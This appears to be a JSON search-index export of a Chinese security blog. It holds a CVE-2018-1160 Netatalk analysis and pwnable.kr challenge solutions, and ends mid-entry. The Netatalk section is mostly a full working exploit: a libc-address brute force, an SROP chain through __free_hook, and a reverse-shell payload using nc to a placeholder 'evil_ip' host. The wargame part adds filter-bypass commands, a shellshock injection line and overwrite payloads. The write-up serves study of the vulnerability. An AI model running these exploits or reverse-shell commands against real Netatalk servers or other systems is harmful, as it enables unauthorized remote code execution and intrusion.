[{"categories":["cve"],"content":"pwnable.tw的第三题，卡住了。基本原理在参考链接里都写了，就记录一下过程然后补充一些我看师傅们博客比较疑惑的点吧。 ","date":"2021-11-05","objectID":"/cve-2018-1160/:0:0","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"简介 Netatalk是Apple归档协议（AFP，Apple Filing Protocol）的一种实现。 想要自己重新编译启动服务可以参考这篇：https://xz.aliyun.com/t/3710 题目给了afpd和libatalk.so,就不自己编译了。 在doc/manpages/man8/afpd.8.xml中有启动方式： \u003crefsynopsisdiv\u003e \u003ccmdsynopsis\u003e \u003ccommand\u003eafpd\u003c/command\u003e \u003carg choice=\"opt\"\u003e-d\u003c/arg\u003e \u003carg choice=\"opt\"\u003e-F \u003creplaceable\u003econfigfile\u003c/replaceable\u003e\u003c/arg\u003e \u003c/cmdsynopsis\u003e \u003ccmdsynopsis\u003e \u003ccommand\u003eafpd\u003c/command\u003e \u003cgroup choice=\"plain\"\u003e \u003carg choice=\"plain\"\u003e-v\u003c/arg\u003e \u003carg choice=\"plain\"\u003e-V\u003c/arg\u003e \u003carg choice=\"plain\"\u003e-h\u003c/arg\u003e \u003c/group\u003e \u003c/cmdsynopsis\u003e \u003c/refsynopsisdiv\u003e 启动：LD_PRELOAD=./libatalk.so.18 ./afpd -d -F afp.conf 在 https://github.com/Netatalk/Netatalk 下载源码后可以git reset --hard 6243b6b89d21754c55f04e168dcfe8bb643a4285方便查阅有漏洞的源码。 ","date":"2021-11-05","objectID":"/cve-2018-1160/:1:0","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"漏洞分析 主要漏洞出现在libatalk/dsi/dsi_opensess.c/dsi_opensession处 /* OpenSession. set up the connection */ void dsi_opensession(DSI *dsi) { size_t i = 0; uint32_t servquant; uint32_t replcsize; int offs; if (setnonblock(dsi-\u003esocket, 1) \u003c 0) { LOG(log_error, logtype_dsi, \"dsi_opensession: setnonblock: %s\", strerror(errno)); AFP_PANIC(\"setnonblock error\"); } /* parse options */ while (i \u003c dsi-\u003ecmdlen) { switch (dsi-\u003ecommands[i++]) { case DSIOPT_ATTNQUANT: memcpy(\u0026dsi-\u003eattn_quantum, dsi-\u003ecommands + i + 1, dsi-\u003ecommands[i]); dsi-\u003eattn_quantum = ntohl(dsi-\u003eattn_quantum); case DSIOPT_SERVQUANT: /* just ignore these */ default: i += dsi-\u003ecommands[i] + 1; /* forward past length tag + length */ break; } } 在这个memcpy处，第三个参数dsi-\u003ecommands[i]的值是可控的，范围在0-255。同时dsi-\u003ecommands + i + 1指针处的内容也是可控的，所以可以覆盖dsi-\u003eattn_quantum地址处的值。dsi的数据结构如下： /* child and parent processes might interpret a couple of these * differently. */ typedef struct DSI { struct DSI *next; /* multiple listening addresses */ AFPObj *AFPobj; int statuslen; char status[1400]; char *signature; struct dsi_block header; struct sockaddr_storage server, client; struct itimerval timer; int tickle; /* tickle count */ int in_write; /* in the middle of writing multiple packets, signal handlers can't write to the socket */ int msg_request; /* pending message to the client */ int down_request; /* pending SIGUSR1 down in 5 mn */ uint32_t attn_quantum, datasize, server_quantum; uint16_t serverID, clientID; uint8_t *commands; /* DSI recieve buffer */ uint8_t data[DSI_DATASIZ]; /* DSI reply buffer */ size_t datalen, cmdlen; off_t read_count, write_count; uint32_t flags; /* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */ int socket; /* AFP session socket */ int serversock; /* listening socket */ /* DSI readahead buffer used for buffered reads in dsi_peek */ size_t dsireadbuf; /* size of the DSI readahead buffer used in dsi_peek() */ char *buffer; /* buffer start */ char *start; /* current buffer head */ char *eof; /* end of currently used buffer */ char *end; #ifdef USE_ZEROCONF char *bonjourname; /* server name as UTF8 maxlen MAXINSTANCENAMELEN */ int zeroconf_registered; #endif /* protocol specific open/close, send/receive * send/receive fill in the header and use dsi-\u003ecommands. * write/read just write/read data */ pid_t (*proto_open)(struct DSI *); void (*proto_close)(struct DSI *); } DSI; #define DSI_BLOCKSIZ 16 struct dsi_block { uint8_t dsi_flags; /* packet type: request or reply */ uint8_t dsi_command; /* command */ uint16_t dsi_requestID; /* request ID */ union { uint32_t dsi_code; /* error code */ uint32_t dsi_doff; /* data offset */ } dsi_data; uint32_t dsi_len; /* total data length */ uint32_t dsi_reserved; /* reserved field */ }; #define DSI_DATASIZ 65536 所以可以覆写attn_quantum/datasize/server_quantum/serverID/clientID/commands/data[DSI_DATASIZ]这些成员。如果commands地址合法server_quantum会回传回来。 当服务器端主进程fork出一个新的连接后，commands指针的生命周期就开始了。当dsi结构初始化后，堆空间将分配出一块内存并赋给commands。每一条传入的AFP消息都将在被Netatalk的AFP函数处理前，先被写入commands指针里。commands占用的内存在连接终止后、程序退出前被释放。 所以输入的内容按照格式先存储在commands里然后再解析commands的内容。 跑一下这个poc: from pwn import * import struct p = remote(\"127.0.0.1\", 5566) dsi_opensession = \"\\x01\" # attention quantum option dsi_opensession += \"\\x18\" # length dsi_opensession += \"A\"*0x10+p64(0xdeadbeefcafebabe) # 覆写commands指针为0xdeadbeefcafebabe dsi_header = \"\\x00\" # \"request\" flag dsi_header += \"\\x04\" # dsi_getsession中想要转到open_session需要dsi_command为DSIFUNC_OPEN dsi_header += \"\\x00\\x01\" # request id dsi_header += \"\\x00\\x00\\x00\\x00\" # data offset dsi_header += struct.pack(\"\u003eI\", len(dsi_opensession)) dsi_header += \"\\x00\\x00\\x00\\x00\" # reserved dsi_header += dsi_opensession p.send(dsi_header) p.recv(0x1c) pause() p.send(dsi_header) p.interactive() 执行完memcopy函数后： 可以看到commands的指针被成功修改成了0xdeadbeefcafebabe 已知在连解断开后，这个commands指针的生命周期才会结束，所以这连解没断开的时候，后续的内容还是会写入这个commands指针指向的地方，commands指针可改的话即可达到地址任意写。 ","date":"2021-11-05","objectID":"/cve-2018-1160/:2:0","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"漏洞利用 一般地址任意写以后可以控制free_hook以及free对象就可以达到RCE的目的。这里用写free_hook的方法。 ","date":"2021-11-05","objectID":"/cve-2018-1160/:3:0","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"爆破libc基址 想要写free_hook首先需要泄露libc基址。 程序开了ASLR，每有一个新的连解就会fork出一个子进程处理，子进程的地址空间与父进程相同。 当覆写的commands指针不合法的时候，会产生段错误。如果是合法地址，服务器会将server_quantum的内容回传。那么可以一位一位的覆盖DSI-\u003ecommands如果没有段错误(有返回内容)则说明爆破正确。 from pwn import * import struct # context.log_level = \"debug\" context.update(arch=\"amd64\",os=\"linux\") ip = 'localhost' port = 5566 libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") def create_header(addr): dsi_opensession = \"\\x01\" # attention quantum option dsi_opensession += chr(len(addr)+0x10) # length dsi_opensession += \"a\"*0x10+addr dsi_header = \"\\x00\" # \"request\" flag dsi_header += \"\\x04\" # open session command dsi_header += \"\\x00\\x01\" # request id dsi_header += \"\\x00\\x00\\x00\\x00\" # data offset dsi_header += struct.pack(\"\u003eI\", len(dsi_opensession)) dsi_header += \"\\x00\\x00\\x00\\x00\" # reserved dsi_header += dsi_opensession return dsi_header addr = \"\" while len(addr)\u003c6 : for i in range(256): r = remote(ip,port) r.send(create_header(addr+chr(i))) try: if \"a\"*4 in r.recvrepeat(1): addr += chr(i) r.close() break except: r.close() val = u64(addr.ljust(8,'\\x00')) print hex(val) addr += \"\\x00\"*2 libc_addr = u64(addr) log.success(\"[+]Now we got an addresss {}\".format(hex(libc_addr))) offset = 0x535a000 # 这个offset与环境相关 libc_base = libc_addr + offset log.success(\"[+]libc base {}\".format(hex(libc_base))) ","date":"2021-11-05","objectID":"/cve-2018-1160/:3:1","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"SROP 已知libc基址+任意地址写的情况下，可以覆写_free_hook后续触发free函数来达到攻击目的。free对象并不容易控制，Balsn战队借助SROP达到RCE的目的。 这篇有对SROP: Sigreturn Oriented Programming的介绍，总的来说就是利用rt_sigreturn恢复ucontext_t的机制，来构造一个假的ucontext_t，这样就能控制所有的寄存器。pwntools现有的库函数是SigreturnFrame。这个链接中同时介绍了使用SROP进行攻击的一种方法： 利用fastbin attack劫持__free_hook,利用setcontex来进行SROP然后ROP读出flag; setcontext函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流. 一般是从setcontext+53开始用的,不然程序容易崩溃,主要是为了避开fldenv [rcx]这个指令，一般用来利用call mprotect-\u003e jmp shellcode 我们在这里同样也是用的这个方法。 将__free_hook改写成__libc_dlopen_mode+56 __libc_dlopen_mode+56处会判断_dl_open_hook是否为空，不为空的话call dlopen_mode。 static struct dl_open_hook _dl_open_hook = { .dlopen_mode = __libc_dlopen_mode, .dlsym = __libc_dlsym, .dlclose = __libc_dlclose, .dlvsym = __libc_dlvsym, }; #endif _dl_open_hook在_free_hook后面，可以覆盖dl_open_hook。覆盖成如下gadget: 0x7f12ef28aaff \u003c_IO_new_fgetpos+207\u003e: mov rdi,rax 0x7f12ef28ab02 \u003c_IO_new_fgetpos+210\u003e: call QWORD PTR [rax+0x20] 此时寄存器中的内容如下: 以上gadget在call QWORD PTR [rax+0x20]这条语句中会调用传入的setcontext+53这个地方，即后续SROP触发的地方。 SROP的rdi设置成system函数，参数为前面传入的反弹shell语句。 from pwn import * import struct context.log_level = \"info\" context.update(arch=\"amd64\",os=\"linux\") ip = 'localhost' port = 5566 libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\") def create_header(addr): dsi_opensession = \"\\x01\" # attention quantum option dsi_opensession += chr(len(addr)+0x10) # length dsi_opensession += \"a\"*0x10+addr dsi_header = \"\\x00\" # \"request\" flag dsi_header += \"\\x04\" # open session command dsi_header += \"\\x00\\x01\" # request id dsi_header += \"\\x00\\x00\\x00\\x00\" # data offset dsi_header += struct.pack(\"\u003eI\", len(dsi_opensession)) dsi_header += \"\\x00\\x00\\x00\\x00\" # reserved dsi_header += dsi_opensession return dsi_header def create_afp(idx,payload): afp_command = chr(idx) # invoke the second entry in the table afp_command += \"\\x00\" # protocol defined padding afp_command += payload dsi_header = \"\\x00\" # \"request\" flag dsi_header += \"\\x02\" # \"AFP\" command dsi_header += \"\\x00\\x02\" # request id dsi_header += \"\\x00\\x00\\x00\\x00\" # data offset dsi_header += struct.pack(\"\u003eI\", len(afp_command)) dsi_header += '\\x00\\x00\\x00\\x00' # reserved dsi_header += afp_command return dsi_header # get libc base addr = \"\" while len(addr)\u003c6 : for i in range(256): r = remote(ip,port) r.send(create_header(addr+chr(i))) try: if \"a\"*4 in r.recvrepeat(1): addr += chr(i) r.close() break except: r.close() val = u64(addr.ljust(8,'\\x00')) print hex(val) addr += \"\\x00\"*2 libc_addr = u64(addr) log.success(\"[+]Now we got an addresss {}\".format(hex(libc_addr))) offset = 0x535a000 libc_base = libc_addr + offset log.success(\"[+]libc base {}\".format(hex(libc_base))) libc.address = libc_base raw_input(\"write free hook: \") free_hook = libc.sym['__free_hook'] # mov rdi,rax ; call QWORD PTR [rax+0x20] magic = libc_base + 0x7eaff dl_openmode = libc_base + 0x166398 dl_open_hook = libc_base + 0x3f0588 r = remote(ip,port) r.send(create_header(p64(free_hook-0x30))) # overwrite afp_command buf with free_hook-0x30 # raw_input(\"write shell: \") rip=\"127.0.0.1\" rport=1234 cmd='bash -c \"nc evil_ip evil_port -t -e /bin/bash\" \\x00'# cat flag to controled ip and port sigframe = SigreturnFrame() sigframe.rdi = free_hook + 8 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rax = 0 sigframe.rsp = free_hook+0x400 sigframe.rip = libc.sym['system'] payload = '\\x00'*0x2e payload += p64(dl_openmode) # free_hook payload += cmd.ljust(0x2c98,'\\x00') payload += p64(dl_open_hook+8) + p64(magic)*4 payload += p64(libc.sym['setcontext']+53) payload += str(sigframe)[0x28:] r.send(create_afp(0,payload)) raw_input(\"get shell: \") r.send(create_afp(18,\"\")) r.interactive() 这个CVE-2018-1160 netatalk越界漏洞复现及分析给的exp中，第一次发送的r.send(create_header(p64(free_hook-0x30)))用来写commands的指针。第二次r.send(create_afp(0,payload))用来在commands处写入布置好的内容。第三次r.send(create_afp(18,\"\"))用来触发free函数。 在afp_over_dsi函数中存在如下语句： function = (u_char) dsi-\u003ecommands[0]; /* AFP replay cache */ rc_idx = dsi-\u003eclientID % REPLAYCACHE_SIZE; LOG(log_debug, logtype_dsi, \"DSI request ID: %u\", dsi-\u003eclientID); if (repla","date":"2021-11-05","objectID":"/cve-2018-1160/:3:2","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["cve"],"content":"参考链接 Exploiting an 18 Year Old Bug https://github.com/Netatalk/Netatalk/commit/750f9b55844b444b8ff1a38206fd2bdbab85c21f CVE-2018-1160 netatalk越界漏洞复现及分析 https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk Netatalk CVE-2018-1160 分析 Linux User Exploit(0)–SROP的引伸 SROP: Sigreturn Oriented Programming ","date":"2021-11-05","objectID":"/cve-2018-1160/:4:0","tags":null,"title":"CVE-2018-1160分析与复现","uri":"/cve-2018-1160/"},{"categories":["writeup"],"content":"不想看毕设跑来摸鱼两天做完了第一部分，有些地方挺有意思的，但我忘了是哪些地方了…都简单写写吧 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:0:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"fd 0：标准输入；1：标准输出；2：标准错误 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:1:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"collision 略 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:2:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"bof 栈溢出覆盖参数值 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:3:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"flag upx壳, upx -d ","date":"2021-11-03","objectID":"/pwnable_kr_1/:4:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"passcode #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } 直接运行简单输入的话会发生段错误。 仔细看scanf的两处，scanf(\"%d\", passcode1)这句话会把输入的数字直接写入地址为passcode1的地方，而不是给passcode1赋值。 welcome和login被连续调用，都没有参数，两者的ebp相同。在welcome中输入的name足够长的话，会被login的栈复用。因此可以控制passcode1的初始值，即可以发生任意地址写。可以将后面调用的fflushgot表的地址修改成system(\"/bin/cat flag\")这一行的地址。 #coding=utf-8 from pwn import * s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest') p=s.process('./passcode') payload='a'* 0x60 + '\\x04\\xa0\\x04\\x08' + '134514147' p.sendline(payload) p.interactive() p.close() ","date":"2021-11-03","objectID":"/pwnable_kr_1/:5:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"random random = rand()的值固定 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:6:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"input #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/socket.h\u003e#include \u003carpa/inet.h\u003e int main(int argc, char* argv[], char* envp[]){ printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)\u0026saddr, sizeof(saddr)) \u003c 0){ printf(\"bind error, use another port\\n\"); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)\u0026caddr, (socklen_t*)\u0026c); if(cd \u003c 0){ printf(\"accept error, tell admin\\n\"); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0; } 输入重定向、环境变量、socket通信等 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e#include \u003cstdlib.h\u003e#include \u003cunistd.h\u003e#include \u003csys/socket.h\u003e#include \u003carpa/inet.h\u003e int main() { char *argv[101] = {0}; char *envp[2] = {\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL}; argv[0] = \"/home/input2/input\"; for(int i = 1; i \u003c 100; i++) { argv[i] = \"a\"; } argv['A'] = \"\\x00\"; argv['B'] = \"\\x20\\x0a\\x0d\"; argv['C'] = \"8888\"; argv[100] = NULL; FILE *fp = fopen(\"\\x0a\", \"wb+\"); if(!fp){ perror(\"Cannot open 0a\"); return -1; } fwrite(\"\\x00\\x00\\x00\\x00\", 4, 1, fp); fclose(fp); fp = NULL; int pipe_stdin[2] = {-1,-1}, pipe_stderr[2] = {-1, -1}; if(pipe(pipe_stdin) \u003c 0 || pipe(pipe_stderr) \u003c 0){ perror(\"Cannot create pipe\"); return -2; } pid_t pid_child; if((pid_child = fork()) \u003c 0) { perror(\"Cannot create child process\"); } if(pid_child == 0){ // 子进程 sleep(1); close(pipe_stdin[0]); close(pipe_stderr[0]); write(pipe_stdin[1], \"\\x00\\x0a\\x00\\xff\", 4); // 信道写入端 write(pipe_stderr[1], \"\\x00\\x0a\\x02\\xff\", 4); }else{ close(pipe_stdin[1]); close(pipe_stderr[1]); dup2(pipe_stdin[0], 0); // 信道读取端 dup2(pipe_stderr[0], 2); execve(\"/home/input2/input\", argv, envp); } sleep(5); int sockfd; struct sockaddr_in saddr; sockfd = socket(AF_INET, SOCK_STREAM, 0); if(sockfd == -1){ perror(\"Cannot create socket!\"); return -3; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); saddr.sin_port = htons( atoi(argv['C'])); if(connect(sockfd, (struct sockaddr*)\u0026saddr, sizeof(saddr)) \u003c 0){ perror(\"Cannot connect to server\"); return -4; } write(sockfd, \"\\xde\\xad\\xbe\\xef\", 4); close(sockfd); return 0; } ","date":"2021-11-03","objectID":"/pwnable_kr_1/:7:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"leg #include \u003cstdio.h\u003e#include \u003cfcntl.h\u003eint key1(){ asm(\"mov r3, pc\\n\"); } int key2(){ asm( \"push {r6}\\n\" \"add r6, pc, $1\\n\" \"bx r6\\n\" \".code 16\\n\" \"mov r3, pc\\n\" \"add r3, $0x4\\n\" \"push {r3}\\n\" \"pop {pc}\\n\" \".code 32\\n\" \"pop {r6}\\n\" ); } int key3(){ asm(\"mov r3, lr\\n\"); } int main(){ int key=0; printf(\"Daddy has very strong arm! : \"); scanf(\"%d\", \u0026key); if( (key1()+key2()+key3()) == key ){ printf(\"Congratz!\\n\"); int fd = open(\"flag\", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(\"I have strong leg :P\\n\"); } return 0; } arm的返回值存储在r0寄存器 (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 \u003c+4\u003e: add r11, sp, #0 0x00008cdc \u003c+8\u003e: mov r3, pc 0x00008ce0 \u003c+12\u003e: mov r0, r3 0x00008ce4 \u003c+16\u003e: sub sp, r11, #0 0x00008ce8 \u003c+20\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec \u003c+24\u003e: bx lr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 \u003c+4\u003e: add r11, sp, #0 0x00008cf8 \u003c+8\u003e: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc \u003c+12\u003e: add r6, pc, #1 0x00008d00 \u003c+16\u003e: bx r6 0x00008d04 \u003c+20\u003e: mov r3, pc 0x00008d06 \u003c+22\u003e: adds r3, #4 0x00008d08 \u003c+24\u003e: push {r3} 0x00008d0a \u003c+26\u003e: pop {pc} 0x00008d0c \u003c+28\u003e: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 \u003c+32\u003e: mov r0, r3 0x00008d14 \u003c+36\u003e: sub sp, r11, #0 0x00008d18 \u003c+40\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c \u003c+44\u003e: bx lr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 \u003c+0\u003e: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 \u003c+4\u003e: add r11, sp, #0 0x00008d28 \u003c+8\u003e: mov r3, lr 0x00008d2c \u003c+12\u003e: mov r0, r3 0x00008d30 \u003c+16\u003e: sub sp, r11, #0 0x00008d34 \u003c+20\u003e: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 \u003c+24\u003e: bx lr End of assembler dump. 计算一下key1,key2,key3结束时r0寄存器的值相加即可。 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:8:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"mistake #include \u003cstdio.h\u003e#include \u003cfcntl.h\u003e #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } 第17行，先比较大小再赋值给fd, fd=0所以后续直接从输入中获取数据…… ","date":"2021-11-03","objectID":"/pwnable_kr_1/:9:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"shellshock CVE-2014-6271 漏洞大概是，Bash支持使用环境变量定义函数，如果环境变量以(){开头，则会被当作导入函数的定义，在shell启动时会生效。 shellshock漏洞细节 env var='() { :;}; /bin/cat flag' ./shellshock ","date":"2021-11-03","objectID":"/pwnable_kr_1/:10:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"coin1 猜数字，直接二分法 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:11:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"blackjack 赌注没做负数过滤 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:12:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"lotto 没过滤相同的字符，输入6个相同的数字，只要有一个随机数等于这个数，就满足输出flag的条件了 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:13:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"cmd1 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } ./cmd1 '/bin/cat f*' ./cmd1 \"/bin/cat \\\"f\\\"\\\"l\\\"\\\"a\\\"\\\"g\\\"\" 在tmp目录下写一个脚本cat /home/cmd1/flag然后./cmd1 sc.sh ","date":"2021-11-03","objectID":"/pwnable_kr_1/:14:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"cmd2 #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int filter(char* cmd){ int r=0; r += strstr(cmd, \"=\")!=0; r += strstr(cmd, \"PATH\")!=0; r += strstr(cmd, \"export\")!=0; r += strstr(cmd, \"/\")!=0; r += strstr(cmd, \"`\")!=0; r += strstr(cmd, \"flag\")!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); if(filter(argv[1])) return 0; printf(\"%s\\n\", argv[1]); system( argv[1] ); return 0; } 增加了限制条件 利用$(pwd): cd /; /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*' 利用command -p参数 command: command [-pVv] command [arg ...] Execute a simple command or display information about commands. Runs COMMAND with ARGS suppressing shell function lookup, or display information about the specified COMMANDs. Can be used to invoke commands on disk when a function with the same name exists. Options: -p use a default value for PATH that is guaranteed to find all of the standard utilities -v print a description of COMMAND similar to the `type' builtin -V print a more verbose description of each COMMAND Exit Status: Returns exit status of COMMAND, or failure if COMMAND is not found. command的-p参数允许使用PATH中默认值，而不是程序设置的临时值 ./cmd2 \"command -p cat \\\"f\\\"\\\"l\\\"\\\"a\\\"\\\"g\\\"\" ","date":"2021-11-03","objectID":"/pwnable_kr_1/:15:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"uaf #include \u003cfcntl.h\u003e#include \u003ciostream\u003e #include \u003ccstring\u003e#include \u003ccstdlib\u003e#include \u003cunistd.h\u003eusing namespace std; class Human{ private: virtual void give_shell(){ system(\"/bin/sh\"); } protected: int age; string name; public: virtual void introduce(){ cout \u003c\u003c \"My name is \" \u003c\u003c name \u003c\u003c endl; cout \u003c\u003c \"I am \" \u003c\u003c age \u003c\u003c \" years old\" \u003c\u003c endl; } }; class Man: public Human{ public: Man(string name, int age){ this-\u003ename = name; this-\u003eage = age; } virtual void introduce(){ Human::introduce(); cout \u003c\u003c \"I am a nice guy!\" \u003c\u003c endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-\u003ename = name; this-\u003eage = age; } virtual void introduce(){ Human::introduce(); cout \u003c\u003c \"I am a cute girl!\" \u003c\u003c endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(\"Jack\", 25); Human* w = new Woman(\"Jill\", 21); size_t len; char* data; unsigned int op; while(1){ cout \u003c\u003c \"1. use\\n2. after\\n3. free\\n\"; cin \u003e\u003e op; switch(op){ case 1: m-\u003eintroduce(); w-\u003eintroduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u003c\u003c \"your data is allocated\" \u003c\u003c endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } 查看Human, Man, Woman等的虚表，发现give_shell是第一项，introduce是第二项。 在new出来的Human结构体中，布局如下：虚表指针 + age + name指针 攻击： 3 -\u003e free m,w这两个块 2 -\u003e new得到 w块，修改虚表指针的内容，改为原来的值-8，那么取第二项的时候实际会取到原来的第一项，即``give_shell`指针 2 -\u003e new得到 m块 1 -\u003e 调用introduce函数，实际调用到give_shell函数 ","date":"2021-11-03","objectID":"/pwnable_kr_1/:16:0","tags":null,"title":"pwnable.kr first part","uri":"/pwnable_kr_1/"},{"categories":["writeup"],"content":"memcpy char* 